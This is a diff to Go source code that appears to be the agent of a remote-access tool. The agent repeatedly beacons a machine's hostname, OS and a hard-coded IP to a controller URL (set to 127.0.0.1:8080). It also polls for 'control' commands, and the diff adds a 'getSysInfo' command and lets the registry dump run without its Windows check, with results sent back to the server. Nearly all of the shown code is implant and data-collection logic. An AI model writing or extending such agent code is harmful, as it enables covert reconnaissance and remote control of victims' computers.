@@ -5,6 +5,8 @@ import (
 	"strings"
 	"encoding/json"
 	"time"
+	"os"
+	"runtime"
 	"os/exec"
 )
 type Target_base_Info struct{
@@ -39,6 +41,7 @@ type Cmd_info struct{
 
 const(
 	get_registry = "getRegistryInfo"
+	get_sys_info = `getSysInfo`
 )
 
 var server_addr = "http://127.0.0.1:8080/create_target"
@@ -50,10 +53,11 @@ var Target_info_b = Target_info{}
 
 func get_target_info(){
 	delay_time_temp := delay_time
-	info := GetInfo()
+	//info := GetInfo()
 	for {
 		Target_info_b.Target_base_info.Ip="10.10.10.111"
-		Target_info_b.Target_base_info.System= info.Sys_info.Sys_os
+		Target_info_b.Target_base_info.System= runtime.GOOS
+		Target_info_b.Target_base_info.Pc_name,_=os.Hostname()
 		Target_info_b.Target_base_info.Create_time = time.Now()
 		data,_ := json.Marshal(Target_info_b.Target_base_info)
 		Send_info(server_addr,string(data))
@@ -112,24 +116,25 @@ func main(){
 						Send_info(update_cmd_not_exec_info_addr, string(data))
 					}
 				}else if cmd_info.Cmd_type == "control"{
+					var result string
 					switch cmd_info.Cmd_value {
 						case get_registry:
-							if Target_info_b.Target_base_info.System =="windows"{
-								registry_infos := Get_registry_infos()
-								var result string
-								for v,k := range(registry_infos){
-									k_result,_ := json.Marshal(k)
-									result += v+":"+string(k_result)+"\n"
-								}
-								cmd_info.Cmd_exec_result = string(result)
-							}else{
-								cmd_info.Cmd_exec_result = "Error:Only windows support registry!"
+							registry_infos := Get_registry_infos()
+							for v,k := range(registry_infos){
+								k_result,_ := json.Marshal(k)
+								result += v+":"+string(k_result)+"\n"
 							}
-							cmd_info.Cmd_exec = true
-							cmd_info.Cmd_exec_time = time.Now()
-							data,_:=json.Marshal(cmd_info)
-							Send_info(update_cmd_not_exec_info_addr,string(data))
+							break
+						case get_sys_info:
+							sys_info,_:= json.Marshal(GetInfo())
+							result = string(sys_info)
+							break
 					}
+					cmd_info.Cmd_exec_result = result
+					cmd_info.Cmd_exec = true
+					cmd_info.Cmd_exec_time = time.Now()
+					data,_:=json.Marshal(cmd_info)
+					Send_info(update_cmd_not_exec_info_addr,string(data))
 				}
 				delay_time_temp = delay_time
 			}
